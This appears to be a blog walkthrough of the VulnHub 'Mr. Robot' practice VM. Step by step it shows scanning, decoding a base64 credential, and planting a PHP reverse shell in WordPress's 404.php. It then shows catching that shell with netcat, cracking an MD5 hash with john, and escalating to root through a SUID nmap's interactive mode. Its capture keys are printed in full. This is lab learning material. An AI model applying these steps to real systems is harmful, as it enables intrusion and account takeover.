  <header class="post-header">
    <h1 class="post-title" itemprop="name headline">VulnHub: Mr. Robot</h1>
    <p class="post-meta">
      <time datetime="2017-10-11T18:37:00+00:00" itemprop="datePublished"></header>

  <div class="post-content" itemprop="articleBody">
    <p><strong>Hello friend.</strong></p>

<p>In celebration of <a href="https://en.wikipedia.org/wiki/Mr._Robot">Mr Robot Season 3</a> premiering <em>tonight</em>, today’s <a href="https://vulnhub.com">Vulnhub</a> box will be “Mr Robot”!</p>

<p>For those who are just joining us, Vulnhub provides intentionally-vulnerable virtual machines to help anyone gain practical hands-on experience in information security and network administration.  It’s great practice for working on penetrating vulnerable hosts.  This host is themed after the hit hacker TV series of the same name.</p>

<p>From the description:</p>

<blockquote>
  <p>This VM has three keys hidden in different locations. Your goal is to find all three. Each key is progressively difficult to find.</p>
</blockquote>

<p>Sounds fun!  Let’s get started.</p>

<h1 id="enumeration">Enumeration</h1>

<p>You should know the drill by now.  Our first volley is usually an nmap scan to see what we’re dealing with:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>root@kali:~# nmap 192.168.128.140

Starting Nmap 7.60 ( https://nmap.org ) at 2017-10-11 10:57 CDT
Nmap scan report for 192.168.128.140
Host is up (0.00053s latency).
Not shown: 997 filtered ports
PORT    STATE  SERVICE
22/tcp  closed ssh
80/tcp  open   http
443/tcp open   https
MAC Address: 00:0C:29:72:C3:7A (VMware)

Nmap done: 1 IP address (1 host up) scanned in 28.36 seconds
</code></pre>
</div>

<p>I browse to the webserver, and am greeted with a really awesome virtual terminal.  It logs in to itself, and then displays the following message:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>11:01 &lt;mr. robot&gt; Hello friend.  If you've come, you've come for a reason.  
You may not be able to explain it yet, but there's a part of you that's 
exhausted with this world... a world that decides where you work, who you 
see, and how you empty and fill your depressing bank account.  Even the 
Internet connection you are using to read this is costing you, slowly 
chipping away at your existence.  There are things you want to say.  
Soon I will give you a voice.  Today your education begins.  

Commands:
prepare
fsociety
inform
question
wakeup
join

root@fsociety:~#
</code></pre>
</div>

<p>Wow… Ok.  Are there Agents coming for me?  Do I need to slip out the window onto the scaffolding?</p>

<p>I try a few of the commands while I wait for <code class="highlighter-rouge">nikto</code> and <code class="highlighter-rouge">dirb</code> to complete.  Most of them just display sloganry or images related to the show.  Which is cool, but not helpful to our goal of rooting the box.  At this stage I decide to continue enumerating the host rather than dive into analyzing this part of the app.  There will be time for that later.</p>

<p>Next I check the ‘robots.txt’ file for the host:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>root@kali:~# curl 'http://192.168.128.140/robots.txt'
User-agent: *
fsocity.dic
key-1-of-3.txt
</code></pre>
</div>

<p>There’s key number one!</p>

<div class="highlighter-rouge"><pre class="highlight"><code>root@kali:~# curl 'http://192.168.128.140/key-1-of-3.txt'
073403c8a58a1f80d943455fb30724b9
</code></pre>
</div>

<p>The <code class="highlighter-rouge">fsocity.dic</code> [sic] file is a dictionary file, which makes me suspect brute-forcing will be a component of this box.</p>

<p>By this time nikto has completed and reveals some interesting details:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>root@kali:~# nikto -h 192.168.128.140
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.128.140
+ Target Hostname:    192.168.128.140
+ Target Port:        80
+ Start Time:         2017-10-10 19:45:44 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-powered-by header: PHP/5.5.29
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server leaks inodes via ETags, header found with file /robots.txt, fields: 0x29 0x52467010ef8ad 
+ Uncommon header 'tcn' found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html, index.php
+ OSVDB-3092: /admin/: This might be interesting...
+ OSVDB-3092: /readme: This might be interesting...
+ Uncommon header 'link' found, with contents: &lt;http://192.168.128.140/?p=23&gt;; rel=shortlink
+ /wp-links-opml.php: This WordPress script reveals the installed version.
+ OSVDB-3092: /license.txt: License file found may identify site software.
+ /admin/index.html: Admin login page/section found.
+ Cookie wordpress_test_cookie created without the httponly flag
+ /wp-login/: Admin login page/section found.
+ /wordpress/: A Wordpress installation was found.
+ /wp-admin/wp-login.php: Wordpress login found
+ /blog/wp-login.php: Wordpress login found
+ /wp-login.php: Wordpress login found
+ 7536 requests: 0 error(s) and 18 item(s) reported on remote host
+ End Time:           2017-10-10 19:51:13 (GMT-5) (329 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
</code></pre>
</div>

<p>Neat.  Some of these exposed dirs are not obviously helpful.  See for example “/readme”:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>root@kali:~# curl http://192.168.128.140/readme.html
I like where you head is at. However I'm not going to help you.

</code></pre>
</div>

<p>However, looking at /license:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>what you do just pull code from Rapid9 or some s@#% since when did you become a script kitty?


do you want a password or something?


ZWxsaW90OkVSMjgtMDY1Mgo=

</code></pre>
</div>

<p>A “script kitty”?!  Now that’s below the belt.  Anyway, the base64 decodes to what looks like a credential set:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>root@kali:~# echo 'ZWxsaW90OkVSMjgtMDY1Mgo=' | base64 -d
elliot:ER28-0652

</code></pre>
</div>

<p>I can’t be sure but I will guess these may be credentials to the WordPress site.</p>

<p>I run WPScan against the site to test for vulnerabilities and while I attempt to log in with the discovered cred pair.</p>

<div class="highlighter-rouge"><pre class="highlight"><code>root@kali:~# wpscan --url http://192.168.128.140 --enumerate
_______________________________________________________________
        __          _______   _____                  
        \ \        / /  __ \ / ____|                 
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \ 
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team 
                       Version 2.9.3
          Sponsored by Sucuri - https://sucuri.net
   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o [A]bort, default: [N]y
[i] Updating the Database ...
[i] Update completed.
[+] URL: http://192.168.128.140/
[+] Started: Tue Oct 10 18:31:01 2017

[...]

</code></pre>
</div>

<p>The discovered version of WordPress contains <a href="https://wpvulndb.com/wordpresses/431">multiple vulnerabilities</a> and the site is using many vulnerable plug-ins.  This is irrelevant at this point to our goal, however, because we are able to sign into WordPress with <code class="highlighter-rouge">elliot:ER28-0652</code>!</p>

<h1 id="gaining-a-foothold">Gaining a Foothold</h1>

<p>Once authenticated to WordPress I upload a <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">php reverse shell</a>.  I go to the Dashboard -&gt; Appearance -&gt; Editor.  From here I can paste my code into any of the files.  The first in the list is the default 404.php file, so it will be our victim today.  I paste the code in, click “Update File”, and then simply browse to the resource with Firefox.</p>

<p>Then I catch my reverse shell with netcat:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>root@kali:~# nc -lp 80
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 00:30:53 up  3:00,  0 users,  load average: 0.00, 0.01, 0.08
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty;pty.spawn("/bin/bash");'
daemon@linux:/$ 

</code></pre>
</div>

<p>That wasn’t so bad!  Now to get the rest of the flags, and get to ROOT.</p>

<h1 id="privilege-escalation">Privilege Escalation</h1>

<p>I examine the filesystem and find a home directory for a user named “robot”</p>

<div class="highlighter-rouge"><pre class="highlight"><code>daemon@linux:/$ ls -l /home
ls -l /home
total 4
drwxr-xr-x 2 root root 4096 Nov 13  2015 robot

</code></pre>
</div>

<p>I explore the directory a little further and find some interesting files:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>daemon@linux:/$ ls -la /home/robot
ls -la /home/robot
total 16
drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5

</code></pre>
</div>

<p>Hmm a raw-md5 hash?</p>

<div class="highlighter-rouge"><pre class="highlight"><code>daemon@linux:/$ cat /home/robot/password.raw-md5
cat /home/robot/password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b

</code></pre>
</div>

<p>MD5 hashing algorithm <a href="https://en.wikipedia.org/wiki/MD5#Security">has been found to have multiple vulnerabilities</a>, so it should be easy to crack.  Let’s try it with john:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>root@kali:~# echo 'c3fcd3d76192e4007dfb496cca67e13b' &gt; hash
root@kali:~# john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 SSE2 4x3])
Press 'q' or Ctrl-C to abort, almost any other key for status
abcdefghijklmnopqrstuvwxyz (?)
1g 0:00:00:00 DONE (2017-10-10 19:52) 16.66g/s 673400p/s 673400c/s 673400C/s abygail..TERRELL
Use the "--show" option to display all of the cracked passwords reliably
Session completed

</code></pre>
</div>

<p>Excellent!</p>

<p>If you struggle with john like I did, there is always the ooooold obscure hacker trick called “Google” which will unmask many, many MD5s and other hashes.</p>

<p>I use the uncovered password to <code class="highlighter-rouge">su</code> to user “robot” and snag the key:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>daemon@linux:/$ su - robot
su - robot
Password: abcdefghijklmnopqrstuvwxyz

$ id
id
uid=1002(robot) gid=1002(robot) groups=1002(robot)
$ cat /home/robot/key-2-of-3.txt
cat /home/robot/key-2-of-3.txt
822c73956184f694993bede3eb39f959

</code></pre>
</div>

<p>Now let’s get some root.</p>

<h1 id="getting-to-root">Getting to root</h1>

<p>I enumerate the filesystem some more, digging around for SUID files:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>robot@linux:~$ find / -xdev -user root -perm -4000 -type f 2&gt;/dev/null
find / -xdev -user root -perm -4000 -type f 2&gt;/dev/null
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown

</code></pre>
</div>

<p>Hmm, interesting.  The <code class="highlighter-rouge">nmap</code> program is SUID root:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>robot@linux:~$ ls -l /usr/local/bin/nmap
ls -l /usr/local/bin/nmap
-rwsr-xr-x 1 root root 504736 Nov 13  2015 /usr/local/bin/nmap

</code></pre>
</div>

<p>Even worse, it is a grossly outdated version:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>robot@linux:~$ /usr/local/bin/nmap --version
/usr/local/bin/nmap --version

nmap version 3.81 ( http://www.insecure.org/nmap/ )
</code></pre>
</div>

<p>Specifically, it is a grossly outdated version which supports the <code class="highlighter-rouge">--interactive</code> flag.  This allows us to drop into a kind of “nmap shell”, which we can then pivot into a real command shell:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>robot@linux:~$ nmap --interactive
nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h &lt;enter&gt; for help
nmap&gt; !sh
!sh
$ id
id
uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
$ cat /root/key-3-of-3.txt
cat /root/key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4

</code></pre>
</div>

<p>Fantastic.</p>

<h1 id="final-thoughts">Final Thoughts</h1>

<p>This was a really cool box and definitely got me into the mood to watch some Mr. Robot tonight!</p>

<p>The creators stated that there are multiple ways to own it, so this explains why some things (such as the brute force dict file) ended up not getting used.  I can tell they put a lot of effort into this machine.  I spent a little more time poking around the box after rooting it and can confirm there are other ways to get it.  If you want to know more you’ll have to download it and find them for yourself. ;)</p>

<p>Thanks for reading, and stay tuned for some posts on some personal projects coming up in the VERY near future.</p>

<p>All the best,</p>
